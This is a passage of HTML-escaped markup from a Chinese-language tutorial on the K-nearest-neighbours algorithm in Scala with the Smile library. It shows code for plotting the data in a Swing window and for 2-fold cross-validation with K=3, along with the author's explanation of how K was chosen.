&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xCoordinate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;yCoordinate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifier&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06131c402465659-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06131c402465659-38&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0055 seconds] --&gt;
&lt;p&gt;你首先可能会奇怪&lt;strong&gt;为什么数据要使用这种格式&lt;/strong&gt;。数据点与它们的标记值之间的间隔是为了更容易地分割测试数据和训练数据，并且在执行 K-NN 算法以及给数据绘图时，API 需要这种数据格式。其次，把数据点存储为一个数组 (Array[Array[Double]])，能够支持 2 维以上的数据点。&lt;/p&gt;
&lt;p&gt;给出这些数据之后，接下来要做的就是将数据可视化。Smile 为这一目的提供了一个很好的绘图库。不过，要使用这一功能，应该把代码转换到 Swing 中去。此外还要把数据导入到绘图库中以得到带有实际绘图结果的 JPane 面板。代码转换之后如下：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061329827751135&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 object KNNExample extends SimpleSwingApplication { 
  def top = new MainFrame {
    title = &quot;KNN Example&quot;
    val basePath = &quot;/.../KNN_Example_1.csv&quot;

    val testData = getDataFromCSV(new File(basePath))

    val plot = ScatterPlot.plot(testData._1,
                                 testData._2, 
                                 &#39;@&#39;, 
                                 Array(Color.red, Color.blue)
                                )
    peer.setContentPane(plot)
    size = new Dimension(400, 400)

  }
  ...&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061329827751135-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061329827751135-17&quot;&gt;17&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;KNNExample&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;KNN Example&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/.../KNN_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-5&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ScatterPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                 &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                 &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;@&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                 &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;peer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setContentPane&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Dimension&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-15&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061329827751135-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061329827751135-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0025 seconds] --&gt;
&lt;p&gt;将数据绘成图是为了检验 K-NN 在这种具体情况中是否为合适的机器学习算法。绘图结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/8e4b653b0791a39cd2ace003acc517b7.jpg&quot; width=&quot;300px&quot; height=&quot;300px&quot;&gt;&lt;/p&gt;
&lt;p&gt;在这个图中可以看到，蓝点和红点在区域 3&amp;lt;x&amp;lt;5 和 5&amp;lt;y&amp;lt;7.5 是混合的。既然两组点混合在一起，那 K-NN 算法就是个不错的选择，若是拟合一条决策边界则会在混合区域造成很多误分。&lt;/p&gt;
&lt;p&gt;考虑到 K-NN 算法是这个问题的一个不错的选择，我们可以继续机器学习的实践。GUI 在这里实际上没有用武之地，我们摒弃不用。回顾机器学习的全局体系这部分，其中提到机器学习的两个关键部分：预测和验证。首先我们进行验证，不作任何验证就把模型拿来使用并不是一个好主意。这里验证模型的主要原因是为了防止过拟合。不过在做验证之前，我们要选择一个合适的 K 值。&lt;/p&gt;
&lt;p&gt;这个方法的缺点就是不存在寻找最佳 K 值的黄金法则。然而，可以通过观察数据来找出一个合理的 K 值，使大多数数据点可以被正确分类。此外，K 值的选取要小心，以防止算法引起的不可判定性。例如，假设 K=2，并且问题包含两种标签，那么，当有一个点落在两种标签之间时，算法会选择哪一种标签呢？有一条经验法则是这样的：K应该是特征数（维数）的平方根。那在我们的例子中就会有K=1，但这真不是一个好主意，因为它会在决策边界导致更高的误分率。考虑到我们有两种标签，让 K=2 会导致错误，因此，目前来说，选择 K=3 是比较合适。&lt;/p&gt;
&lt;p&gt;在这个例子中，我们做 2 折交叉验证。一般来讲，2 折交叉验证是一种相当弱的模型验证方法，因为它将数据集分割为两半并且只验证两次，仍有可能产生过拟合，不过由于这里的数据集只包含 100 个点，10 折验证（一个较强的版本）发挥不了作用，因为这样的话，将只有 10 个点用于测试，会导致误差率倾斜。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06132f102130773&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 def main(args: Array[String]): Unit = {
   val basePath = &quot;/.../KNN_Example_1.csv&quot;
    val testData = getDataFromCSV(new File(basePath))

    //Define the amount of rounds, in our case 2 and 
    //initialise the cross validation
    //在这第二种情况中我们设置了交叉验证的次数并初始化交叉验证
    val cv = new CrossValidation(testData._2.length, validationRounds)

    val testDataWithIndices = (testData
                                ._1
                                .zipWithIndex, 
                                testData
                                ._2
                                .zipWithIndex)

    val trainingDPSets = cv.train
      .map(indexList =&amp;gt; indexList
      .map(index =&amp;gt; testDataWithIndices
      ._1.collectFirst { case (dp, `index`) =&amp;gt; dp}.get))

    val trainingClassifierSets = cv.train
      .map(indexList =&amp;gt; indexList
      .map(index =&amp;gt; testDataWithIndices
      ._2.collectFirst { case (dp, `index`) =&amp;gt; dp}.get))

    val testingDPSets = cv.test
      .map(indexList =&amp;gt; indexList
      .map(index =&amp;gt; testDataWithIndices
      ._1.collectFirst { case (dp, `index`) =&amp;gt; dp}.get))

    val testingClassifierSets = cv.test
      .map(indexList =&amp;gt; indexList
      .map(index =&amp;gt; testDataWithIndices
      ._2.collectFirst { case (dp, `index`) =&amp;gt; dp}.get))


    val validationRoundRecords = trainingDPSets
      .zipWithIndex.map(x =&amp;gt; (  x._1,           
                                trainingClassifierSets(x._2),
                                testingDPSets(x._2),
                                testingClassifierSets(x._2)
                               )
                        )

    validationRoundRecords
        .foreach { record =&amp;gt;

      val knn = KNN.learn(record._1, record._2, 3)

      //And for each test data point make a prediction with the model
      //对每个测试数据点，用模型做一次预测
      val predictions = record
        ._3
        .map(x =&amp;gt; knn.predict(x))
        .zipWithIndex

      //Finally evaluate the predictions as correct or incorrect
      //and count the amount of wrongly classified data points.
      //最后检验预测结果正确与否，并记下被错误分类的数据点的个数

      val error = predictions
        .map(x =&amp;gt; if (x._1 != record._4(x._2)) 1 else 0)
        .sum

      println(&quot;False prediction rate: &quot; + error / predictions.length * 100 + &quot;%&quot;)
    }
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-34&quot;&gt;34&lt;/div&gt;
